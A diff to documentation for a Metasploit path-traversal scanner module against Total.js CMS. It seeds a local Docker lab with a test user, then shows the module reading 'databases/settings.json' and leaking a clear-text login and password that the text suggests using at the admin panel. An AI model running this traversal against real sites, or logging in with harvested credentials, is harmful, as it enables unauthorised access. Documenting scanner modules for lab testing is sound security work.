@@ -23,8 +23,12 @@ cd into the new directory and download the Total.js CMS
 
 ```
 root@kali:~# cd totaljs && git clone https://github.com/totaljs/cms.git
-root@kali:~# mkdir totaljs
 ```
+In order to have at least one user in our CMS, replace the content of `cms/databases/settings.json` with this:
+ 
+ ```
+ {"componentator":false,"smtpoptions":"","smtp":"","languages":[],"signals":[],"users":[{"id":"f92trzhgdkvu1mt","name":"Fabio Cogno","login":"fabio.cogno","password":"certimetergroup","roles":["Dashboard","Events","Newsletters","Notices","Pages","Posts","Settings","Subscribers","Widgets"]}],"navigations":[{"id":"mainmenu","name":"Main menu"}],"notices":[{"id":"tweet","name":"Tweet"}],"posts":[{"id":"blog","name":"Blog"}],"templatesnewsletters":[{"id":"newsletter","name":"Default"}],"templatesposts":[{"id":"post","name":"Default"}],"templates":[{"id":"default","name":"Default"},{"id":"navigation","name":"With navigation"},{"id":"fluid","name":"Fluid"}],"url":"http://127.0.0.1:8000","emailsender":"info@totaljs.com","emailreply":"info@totaljs.com","emailcontactform":"info@totaljs.com"}
+ ```
 Then, create the `dockerfile` and open it with your favorite editor (e.g.: `nano dockerfile`). This file allow us to create an image from a node v8 image, install Total.js framework and copy the Total.js CMS in it:
 
 ```
@@ -97,6 +101,18 @@ msf5 auxiliary(scanner/http/totaljs_traversal) > set FILE databases/settings.jso
 FILE => databases/settings.json
 msf5 auxiliary(scanner/http/totaljs_traversal) > run
 ```
+
+The output of the module is like this:
+
+```
+msf5 auxiliary(scanner/http/totaljs_traversal) > run
+
+[*] Getting databases/settings.json...
+{"componentator":false,"smtpoptions":"","smtp":"","languages":[],"signals":[],"users":[{"id":"f92trzhgdkvu1mt","name":"Fabio Cogno","login":"fabio.cogno","password":"certimetergroup","roles":["Dashboard","Events","Newsletters","Notices","Pages","Posts","Settings","Subscribers","Widgets"]}],"navigations":[{"id":"mainmenu","name":"Main menu"}],"notices":[{"id":"tweet","name":"Tweet"}],"posts":[{"id":"blog","name":"Blog"}],"templatesnewsletters":[{"id":"newsletter","name":"Default"}],"templatesposts":[{"id":"post","name":"Default"}],"templates":[{"id":"default","name":"Default"},{"id":"navigation","name":"With navigation"},{"id":"fluid","name":"Fluid"}],"url":"http://127.0.0.1:8000","emailsender":"info@totaljs.com","emailreply":"info@totaljs.com","emailcontactform":"info@totaljs.com"}
+[*] Auxiliary module execution completed
+```
+
+You can observe some useful informations, especially the username `"login":"fabio.cogno"` and the clear text password `"password":"certimetergroup"`. Now we can browse to [http://localhost:8322/admin/](http://localhost:8322/admin/) and try to login with the discovered credentials.
 
 ## Thanks
 
